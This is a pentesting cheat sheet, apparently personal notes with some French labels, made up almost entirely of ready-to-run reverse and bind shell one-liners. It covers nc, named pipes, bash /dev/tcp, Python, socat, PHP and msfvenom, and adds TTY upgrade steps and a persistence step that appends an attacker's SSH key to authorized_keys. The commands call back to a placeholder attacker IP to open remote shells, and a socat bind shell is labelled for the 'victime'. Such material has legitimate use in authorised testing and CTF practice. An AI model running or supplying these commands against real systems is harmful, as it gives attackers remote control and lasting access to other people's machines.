# Shells

### Reverse Shells

**RS to meterpreter**

* `msf5 exploit(multi/handler) > sessions -u <ID>`

**nc**

* `nc -e /bin/bash <IP> <PORT>`
* `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f`

**Named pipe**

* `mknod /tmp/backpipe p`
* `/bin/sh 0</tmp/backpipe | nc <IP> <PORT> 1>/tmp/backpipe`

**Bash**

* `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1`
  * If it doesn't work, do : `bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'`

**Python**

* `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
* `python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('<IP>',<PORT>))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"`

**Socat**

* Launch : `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>`
* Listen : `socat file:`tty`,raw,echo=0 tcp-listen:<PORT>`

**ASP**

* For Windows: `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > <OUTPUT>.asp`

**PHP**

* `php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'`
* [https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php](https://github.com/Dhayalanb/windows-php-reverse-shell/blob/master/Reverse%20Shell.php)

**Get a TTY**

* To get a PTY : `python -c 'import pty; pty.spawn("/bin/bash")'`
  * Try python3 if python is not found
* Ctrl+z from your shell
* On your device : `stty raw -echo`
* To go back to the shell : `fg`
* Inside the shell : `export TERM=screen`
  * Use `env |grep TERM` to see the value of the TERM variable
  * `stty -a` - `export SHELL=bash` - `export TERM=xterm256-color` - `stty rows <ROWS> columns <COLUMNS>`

**Access through a bastion using an agent**

* `ssh -J <USER-ACCOUNT>@<JUMP-TARGET> <USER-ACCOUNT>@<FINAL-TARGET> -A`

**Add RSA key on authorized\_keys**

`ssh-keygen -t rsa -b 4096 -o -a 100`

`echo "\n\nssh-rsa <cle-publique>" >> ~/.ssh/authorized_keys`

`ssh hal@10.10.10.139 -i id_rsa`

### Bind shells

**Deploy a bind shell**

* VICTIME : `socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane`
* KALI : `socat FILE:`tty`,raw,echo=0 TCP:<IP-VICTIME>:9999`
